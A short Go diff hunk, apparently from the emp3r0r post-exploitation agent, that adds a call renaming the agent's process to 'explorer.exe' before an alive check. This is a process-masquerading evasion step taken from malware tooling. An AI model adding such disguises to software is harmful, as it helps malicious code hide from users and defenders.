@@ -98,6 +98,9 @@ func main() {
 		os.Exit(0)
 	}
 
+	// rename agent process
+	agent.SetProcessName("explorer.exe")
+
 	// if the agent's process name is not "emp3r0r"
 test_agent:
 	alive := isAgentAlive()
